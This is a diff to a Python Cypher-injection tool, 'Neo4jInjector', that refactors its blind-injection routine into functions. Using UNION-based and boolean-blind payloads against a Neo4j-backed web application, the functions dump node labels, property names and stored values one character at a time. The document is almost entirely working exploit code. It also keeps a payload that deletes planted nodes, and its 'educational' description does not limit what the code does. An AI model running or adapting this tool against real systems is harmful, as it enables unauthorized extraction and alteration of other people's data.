@@ -320,12 +320,12 @@ class Neo4jInjector:
         for label in labels:
             print(f"[+] {label}")
 
-        node_count_list = []
+        node_counts = []
         for label in labels:
             # dump node count
             self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
             node_count = get_data()  
-            node_count_list.append(node_count)
+            node_counts.append(node_count)
 
             # Dump property count
             self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")
@@ -414,86 +414,177 @@ class Neo4jInjector:
     def clean_up(self):
         self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
 
-    def blind(self):
-        # Combine ASCII letters, digits, and punctuation
-        valid_chars = string.ascii_letters + string.digits + string.punctuation
-
-        # Dump label count
-        for i in range(1000):
-            responses = self.inject_payload(f" AND COUNT {{CALL db.labels() YIELD label RETURN label}} = {i} and '1'='1")
-            # Check for the word "Sarah" in each response
+    def find_label_count(self):
+        for count_index in range(1000):
+            responses = self.inject_payload(f" AND COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index} and '1'='1")
             if any("Sarah" in response.text for response in responses):
-                label_count = i
-                # print(f"Label count: {label_count}")
-                break  # Break out of the inner loop if "Sarah" is found
+                return count_index
+        return 0
 
-        # Dump size of label
-        label_sizes = []
-        for i in range(label_count):
-            for n in range(1000): 
-                responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{i}]) = {n} RETURN list}}  AND '1' = '1")
-                # Check if any of the responses contain the word "Sarah"
+    def find_label_sizes(self, label_count):
+        label_sizes_dict = {}
+        for count_index in range(label_count):
+            for size_index in range(1000):
+                responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}  AND '1' = '1")
+                
                 if any("Sarah" in response.text for response in responses):
-                    #print(f"Found 'Sarah' in response for label {i}, size {n}")
-                    label_sizes.append(n)
-                    break  # Exit the inner loop once "Sarah" is found
+                    label_sizes_dict[count_index] = size_index
+                    break
+        return label_sizes_dict
 
-        # Dump label
+    def dump_labels(self, label_sizes):
+        valid_chars = string.ascii_letters + string.digits + string.punctuation
         labels = []
-        for i in range(label_count):  
+        for count_index, size in label_sizes.items():
             label = ''
-            for n in range(label_sizes[i]):
+            for size_index in range(size):
                 for char in valid_chars:
-                    responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{i}], {n}, 1) = '{char}' RETURN list}} AND '1' = '1")
-                    # Check if any of the responses contain the word "Sarah"
+                    responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}} AND '1' = '1")
+                    print(f"Found Label: {label}{char}", end='\r')
                     if any("Sarah" in response.text for response in responses):
-                        # print(f"Found 'Sarah' in response for label {i}, size {n}, character {char}")
                         label += char
-                        break  # Exit the inner loop once "Sarah" is found
+                        break
             labels.append(label)
+        return labels
+
+
+    def find_property_counts(self, labels):
+        property_counts_dict = {}
+        for label in labels:
+            for count_index in range(1000):
+                responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {count_index} AND '1' = '1")
+                # Check for the word "Sarah" in each response
+                if any("Sarah" in response.text for response in responses):
+                    property_counts_dict[label] = count_index
+                    break
+        return property_counts_dict
+
+    def find_property_sizes(self, property_counts_dict):
+        property_sizes_dict = {}
+
+        for label, count in property_counts_dict.items():
+            for count_index in range(count):  
+                for size_index in range(1000):
+                    # Construct and send your query
+                    responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}} AND '1' = '1")
+                    # Debugging print statement to show the current n value
+                    print(f"{label} - {count_index} prop size {size_index}")
+                    # Check if "Sarah" is in any of the responses
+                    if any("Sarah" in response.text for response in responses):
+                        if label not in property_sizes_dict:
+                            property_sizes_dict[label] = {}
+                        # Now that we're sure label exists in value_counts, record the count
+                        property_sizes_dict[label][count_index] = size_index
+                        print(f"Found 'Sarah' in response for label {label}, count {count_index}, size {size_index}")
+                        break  # Stop searching after finding "Sarah" for this property
+        return property_sizes_dict
+
+
+    def dump_properties(self, property_sizes_dict):
+        valid_chars = string.ascii_letters + string.digits + string.punctuation
+        properties_dict = {}
+        for label, size_dict in property_sizes_dict.items():
+            for count_index, size in size_dict.items():
+                pr0perty = ''
+                for size_index in range(size):
+                    for char in valid_chars:
+                        responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(list[{count_index}],{size_index},1) = '{char}' RETURN list}} AND '1' = '1")
+                        # Check if any of the responses contain the word "Sarah"
+                        if any("Sarah" in response.text for response in responses):
+                            print(f"Found 'Sarah' in response for property {count_index}, size {size_index}, character {char}")
+                            pr0perty += char
+                            break  # Exit the inner loop once "Sarah" is found
+
+                if label in properties_dict:
+                    properties_dict[label].append(pr0perty)
+                else:
+                    properties_dict[label] = [pr0perty]
+
+        return properties_dict
+
+    def find_value_count(self, properties_dict):
+        value_counts_dict = {}
+        for label, properties in properties_dict.items():
+            for pr0perty in properties:
+                for count_index in range(1000):
+                    responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) RETURN x.{pr0perty}}} = {count_index} AND '1' = '1")
+                    # Check for the word "Sarah" in each response
+                    if any("Sarah" in response.text for response in responses):
+                        # Ensure the label is in value_counts, creating a dict for it if not
+                        if label not in value_counts_dict:
+                            value_counts_dict[label] = {}
+                        # Now that we're sure label exists in value_counts, record the count
+                        value_counts_dict[label][pr0perty] = count_index
+                        print(f"Found 'Sarah' in response for label {label}, property {pr0perty}, count {count_index}")
+                        break  # Stop searching after finding "Sarah" for this property
+        return value_counts_dict
+
+
+    def find_value_size(self, value_counts_dict):
+        value_sizes_dict = {}
+        for label, properties_dict in value_counts_dict.items():
+            value_sizes_dict[label] = {}
+            for pr0perty, count in properties_dict.items():
+                value_sizes_dict[label][pr0perty] = {}
+                for count_index in range(count):  # Assuming 'size' here actually meant 'count' in your initial approach
+                    for size_index in range(1000):  # Assuming 'n' is the size you're looking to determine
+                        responses = self.inject_payload(f" AND EXISTS {{MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}} AND '1' = '1")
+                        # Check for the word "Sarah" in each response
+                        if any("Sarah" in response.text for response in responses):
+                            if count_index not in value_sizes_dict[label][pr0perty]:
+                                value_sizes_dict[label][pr0perty][count_index] = size_index
+                            print(f"Found 'Sarah' in response for label {label}, pr0perty {pr0perty}, occurrence {count_index} with size {size_index}")
+                            break  # Found the size for this occurrence, no need to continue
+        return value_sizes_dict
+
+    def dump_value(self, value_sizes_dict):
+        valid_chars = string.ascii_letters + string.digits + string.punctuation
+        values = []
+        for label, properties_dict in value_sizes_dict.items():
+            for pr0perty, size_dict in properties_dict.items():
+                for count_index, size in size_dict.items():
+                    value = ''
+                    for size_index in range(size):
+                        for char in valid_chars:
+                            responses = self.inject_payload(f" AND EXISTS {{ MATCH (x:{label}) WITH COLLECT(x.{pr0perty}) as list WHERE SUBSTRING(list[{count_index}], {size_index}, 1) = '{char}' RETURN list}} AND '1' = '1")
+                            if any("Sarah" in response.text for response in responses):
+                                value += char
+                                print(f"Found 'Sarah' in response for label {label}, property {pr0perty}, occurrence {count_index} with size {size_index}, with char {char}")
+                                break  # Found the size for this occurrence, no need to continue
+                    values.append(value)
+        return values
+
+    def blind(self):
+        label_count = self.find_label_count()
+        label_sizes_dict = self.find_label_sizes(label_count)
+        print(label_sizes_dict)
+        labels = self.dump_labels(label_sizes_dict)
+        print(labels)
+        property_counts_dict = self.find_property_counts(labels)
+        print(property_counts_dict)
+        property_sizes_dict = self.find_property_sizes(property_counts_dict)
+        print(property_sizes_dict)
+        properties_dict = self.dump_properties(property_sizes_dict)
+        value_counts_dict = self.find_value_count(properties_dict)
+        value_sizes_dict = self.find_value_size(value_counts_dict)
+        values = self.dump_value(value_sizes_dict)
+
 
         print(f"\n[*] available labels [{label_count}]:")
         for label in labels:
             print(f"[+] {label}")
 
-        # Dump node count
-        node_count_list = []
-        for label in labels:
-            for i in range(1000):
-                responses = self.inject_payload(f" AND COUNT {{MATCH(x:{label}) RETURN x}} = {i} AND '1' = '1")
-                # Check for the word "Sarah" in each response
-                if any("Sarah" in response.text for response in responses):
-                    node_count_list.append(i)
-                    break  # Break out of the inner loop if "Sarah" is found
-        # print(node_count_list)
 
-            for i in range(1000):
-                responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {i} AND '1' = '1")
-                # Check for the word "Sarah" in each response
-                if any("Sarah" in response.text for response in responses):
-                    property_count = i
-                    # print(f"Label count: {label_count}")
-                    break  # Break out of the inner loop if "Sarah" is found
-                
+        print(properties_dict)
+        for label, properties in properties_dict.items():
             print(f"\n[*] Label: {label}")
-            print(f"[+] available properties [{property_count}]:")
+            print(f"[+] available properties [{len(properties)}]")
+            for pr0perty in properties:
+                print(f"[++] {pr0perty}")
 
-
-            for i in range(property_count):
-                for n in range(10):
-                    payload = f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{i}]) = {n} RETURN list}} AND '1' = '1"
-                    print(payload)
-
-            # for pr0perty in properties:
-            #     print(f"[++] {pr0perty}")
-
-            
-
-
-
-
-
-
+        print(value_counts_dict)
+        print(value_sizes_dict)
+        print(values)
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
@@ -542,7 +633,7 @@ def main():
 
     # Begin exfiltration process
     injector.blind()
-    injector.exfil_data()
+    # injector.exfil_data()
     # injector.exfil_relationship()
     # injector.clean_up()
 
